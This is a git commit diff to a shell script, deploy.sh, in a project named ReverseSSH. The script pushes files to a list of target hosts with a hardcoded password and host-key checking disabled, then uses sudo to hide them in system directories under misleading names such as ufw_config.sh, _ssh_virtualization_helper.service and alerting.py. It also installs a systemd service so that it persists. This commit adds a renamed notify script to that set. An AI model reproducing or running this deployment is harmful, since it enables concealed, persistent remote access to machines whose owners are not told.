17cdb3a324abd9e68414e5222b3da3b73b05d73c
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-04-04 14:50:05 -0400

    notify added

--- ReverseSSH/deploy.sh
+++ ReverseSSH/deploy.sh
@@ -9,17 +9,20 @@ for TARGET in "${TARGETS[@]}"; do
     sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./ufw_config.sh ${USER}@${TARGET}:/tmp/ufw_config.sh
     sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./_ssh_virtualization_helper.sh ${USER}@${TARGET}:/tmp/_ssh_virtualization_helper.sh
     sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./_ssh_virtualization_helper.service ${USER}@${TARGET}:/tmp/_ssh_virtualization_helper.service
+    sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./notify.py ${USER}@${TARGET}:/tmp/alerting.py
     sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no ${USER}@${TARGET} "\
     echo \"$PASS\" | sudo -S bash -c '
         set -e
 
         mv /tmp/ufw_config.sh /etc/ufw/applications.d/ufw_config.sh
+        mv /tmp/alerting.py /etc/ufw/applications.d/alerting.py
         mv /tmp/_ssh_virtualization_helper.sh /etc/ssh/sshd_config.d/_ssh_virtualization_helper.sh
         mv /tmp/_ssh_virtualization_helper.service /etc/systemd/system/_ssh_virtualization_helper.service
 
         chmod +x /etc/ufw/applications.d/ufw_config.sh
         chmod +x /etc/ssh/sshd_config.d/_ssh_virtualization_helper.sh
-
+        chmod +x /etc/ufw/applications.d/alerting.py
+        
         systemctl daemon-reload
         systemctl enable _ssh_virtualization_helper.service
         systemctl start _ssh_virtualization_helper.service
